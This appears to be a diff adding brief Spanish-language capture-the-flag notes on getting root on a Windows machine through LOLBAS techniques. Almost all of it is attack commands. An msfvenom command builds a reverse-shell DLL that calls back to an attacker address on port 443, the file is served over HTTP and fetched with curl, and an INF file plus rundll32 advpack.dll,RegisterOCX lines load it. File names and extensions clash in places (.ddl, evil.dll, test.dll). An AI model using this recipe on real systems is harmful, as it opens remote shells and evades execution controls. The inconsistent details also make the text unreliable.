@@ -1,0 +1,32 @@
+Root.txt
+La solucion esta en lolbas.
+
+(Avisar de poner path en .inf)
+
+Creo en .ddl.
+msfvenom -p windows/x64/powershell_reverse_tcp -ax64 LHOST=192.168.56.1 LPORT=443 -f dll > evil.dll
+
+Lo subo a la maquina:
+python3 -m http.server
+curl http://IP:PORT/path/file.ddl
+
+Creo archivo .inf.
+Archivo inf:
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+ 
+[DefaultInstall_SingleUser]
+RegisterOCXs=RegisterOCXSection
+ 
+[RegisterOCXSection]
+C:\path\evil.dll
+ 
+[Strings]
+AppAct = "SOFTWARE\Microsoft\Connection Manager"
+ServiceName="mantvydas"
+ShortSvcName="mantvydas"
+
+
+C:\Windows\System32\script.exe -ArgumentList 'advpack.dll,RegisterOCX test.dll'
+rundll32.exe advpack.dll,RegisterOCX test.dll
